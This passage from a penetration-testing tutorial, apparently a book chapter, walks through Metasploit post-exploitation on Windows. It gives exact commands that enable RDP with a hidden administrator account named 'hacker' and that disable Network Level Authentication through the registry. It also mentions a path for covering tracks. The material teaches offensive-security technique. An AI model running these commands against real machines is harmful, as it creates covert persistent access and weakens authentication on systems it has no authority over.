    ```


    to get info on the Windows Manage Enable Remote Desktop module.


    b. Run it with the following command:


    ```

    run post/windows/manage/enable_rdp username=hacker password=AAAbbb111

    ```


    Notice all of the background actions that are taking place, including opening
    a port in the local firewall if necessary, adding the user hacker (you can either
    do this with the mindset of a white hat hacker or a black hat hacker) with the
    password specified, adding the user to the Remote Desktop Users group, hiding
    the user from the Windows Login screen, and adding the user to the Administrators
    group. You’ll also notice a file path for cleaning up and covering your tracks,
    which will be referenced in Step 6e.


    c. Enter the following command (note that this is one command that wraps; do not
    press ENTER to break up this or the rest of the commands in the chapter):


    ```

    reg setval -k ''HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp''
    -v UserAuthentication -d ''0''

    ```


    This command goes to a registry key (-k) and changes a value (-v) with specific
    data (-d). This is necessary to bypass the setting of Require Computers to Use
    Network Level Authentication to Connect.'
